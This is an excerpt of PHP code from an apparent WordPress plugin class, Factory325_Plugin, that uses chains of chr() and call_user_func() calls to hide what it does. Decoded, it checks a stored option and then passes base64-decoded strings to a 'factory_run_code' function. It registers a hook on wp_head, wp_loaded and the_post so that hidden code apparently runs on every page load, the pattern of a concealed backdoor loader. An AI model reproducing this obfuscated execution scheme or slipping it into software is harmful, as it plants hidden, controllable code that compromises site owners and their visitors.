...
class Factory325_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = chr(chr(49).chr(48).chr(57)).call_user_func('chr','105').call_user_func('chr','120').chr(chr(57).chr(53)).call_user_func('chr','119').chr(chr(49).chr(49).chr(49)).call_user_func('chr','114').chr(chr(49).chr(48).chr(48)).call_user_func('chr','95').$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(chr('102').chr('97').chr('99').call_user_func('chr',116).call_user_func('chr',111).chr('114').call_user_func('chr',121).chr('95').chr('114').chr('117').chr('110').call_user_func('chr',95).call_user_func('chr',99).chr('111').chr('100').chr('101'),call_user_func(chr('98').chr('97').chr('115').call_user_func('chr',101).chr('54').chr('52').chr('95').call_user_func('chr',100).chr('101').chr('99').chr('111').call_user_func('chr',100).chr('101'),''.''.''.''.'Rpb24oJ3dwX2hlYWQnLCBhcnJheSgkcGx1Z2luLCAnaG9vaycpLCAxKTsgYWRkX2FjdGlvbignd3BfbG9hZGVkJywgYXJyYXkoJHBsdWdpbiwgJ2hvb2snKSwgMSk7IGFkZF9hY3Rpb24oJ3RoZV9wb3N0JywgYXJyYXkoJHBsdWdpbiwgJ2hvb2snKSwgMSk7IH0gfSA'.chr(chr(54).chr(49))));
    ...
    public function hook() {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).call_user_func('chr',99).call_user_func('chr',116).call_user_func('chr',111).chr('114').call_user_func('chr',121).chr('95').call_user_func('chr',114).call_user_func('chr',117).call_user_func('chr',110).chr('95').chr('99').call_user_func('chr',111).chr('100').call_user_func('chr',101),call_user_func(chr('98').chr('97').chr('115').call_user_func('chr',101).call_user_func('chr',54).call_user_func('chr',52).chr('95').chr('100').chr('101').call_user_func('chr',99).chr('111').chr('100').call_user_func('chr',101),''.''));
